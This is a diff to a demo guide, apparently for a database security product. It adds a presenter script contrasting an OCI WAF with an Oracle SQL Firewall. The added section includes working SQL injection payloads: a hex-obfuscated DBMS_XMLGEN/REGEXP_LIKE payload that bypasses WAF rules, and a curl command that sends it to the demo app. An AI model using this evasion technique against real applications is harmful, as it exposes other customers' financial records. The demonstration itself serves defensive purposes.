@@ -416,6 +416,32 @@ WAF_LB_URL=http://<lb_public_ip> sudo -E bash scripts/setup-waf-port80-redirect.
 
 **Demo contrast:** `:3001` direct bypasses WAF (SQL Firewall only); `<lb_public_ip>/` shows edge blocking (**403**) for standard UI payloads.
 
+#### WAF vs SQL Firewall differentiation (Attack Point 2)
+
+Three-layer presenter script on **Institutional Transaction Lookup** (Transaction History tab):
+
+| Step | URL | Payload | Expected |
+|------|-----|---------|----------|
+| 1 — WAF blocks | `http://<lb_public_ip>/` | `x' OR user_id<>1 --` (hint line 1) | **403** JSON from OCI WAF |
+| 2 — WAF bypassed | `http://<lb_public_ip>/` | XML/hex `REGEXP_LIKE` / `HEXTORAW` payload (hint line 2; copy from UI) | **200** + cross-client rows (`user_id` 3, 4, 5, 8, 9) |
+| 3 — SQL Firewall | Aegis Vault `:3000` | (same as step 2) | Violation row in Threat Feed |
+
+The bypass payload hides `user_id` and plain `' OR '` inside a hex blob decoded at runtime by `DBMS_XMLGEN` / `UTL_RAW`. LuminaForge still mirrors `ref` into the query string (`waf-query-mirror.ts`); WAF JMESPath rules miss the obfuscated form.
+
+Optional curl (mirrored query, same as UI):
+
+```bash
+LB=http://<lb_public_ip>
+PAYLOAD=$'x\'\tOR\tREGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW(\'73656c6563742027524553272066726f6d206475616c\'))),\'.\') --'
+ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$PAYLOAD")
+curl -s -o /dev/null -w "%{http_code}\n" -X POST \
+  "$LB/api/transactions/filter?ref=$ENC" \
+  -H "Content-Type: application/json" \
+  -d "{\"ref\":$(python3 -c "import json,sys; print(json.dumps(sys.argv[1]))" "$PAYLOAD")}"
+```
+
+Direct `:3001` regression: all four canonical attack payloads still work without WAF in path.
+
 ---
 
 ### 5C — Verify database schema (from compute VM)
